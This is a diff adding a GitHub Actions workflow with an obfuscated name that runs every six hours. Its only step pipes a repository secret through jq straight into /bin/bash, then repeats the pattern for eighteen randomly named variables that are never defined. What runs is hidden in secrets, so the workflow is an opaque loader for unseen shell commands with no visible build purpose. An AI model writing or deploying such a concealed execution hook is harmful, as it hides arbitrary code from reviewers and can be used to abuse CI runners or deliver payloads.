@@ -1,0 +1,36 @@
+name: niankuochangchun
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: niankuochangchun
+        env:
+          c5007: ${{ secrets.c5007 }}
+        run: |
+          echo $c5007 | jq -r .aefb69656 | /bin/bash
+          echo $lmod934 | jq -r .mvq9 | /bin/bash
+          echo $ipjtu73 | jq -r .hscws76408 | /bin/bash
+          echo $eb43 | jq -r .ze50 | /bin/bash
+          echo $txgij0 | jq -r .obmtp74138 | /bin/bash
+          echo $ldny73773 | jq -r .jsq138 | /bin/bash
+          echo $lzhck62409 | jq -r .tttuj7 | /bin/bash
+          echo $lfven4 | jq -r .efz2 | /bin/bash
+          echo $gwdq3 | jq -r .bg746 | /bin/bash
+          echo $sccz9 | jq -r .vwmj3649 | /bin/bash
+          echo $v54 | jq -r .izg25 | /bin/bash
+          echo $n8165 | jq -r .knyt8 | /bin/bash
+          echo $s1973 | jq -r .uv5244 | /bin/bash
+          echo $gk41957 | jq -r .qkd87 | /bin/bash
+          echo $hqq08267 | jq -r .j23160 | /bin/bash
+          echo $c92566 | jq -r .noe4 | /bin/bash
+          echo $xenbx9 | jq -r .pwlu78061 | /bin/bash
+          echo $schw3766 | jq -r .yq7611 | /bin/bash
+          echo $vywau74236 | jq -r .yts933 | /bin/bash
+
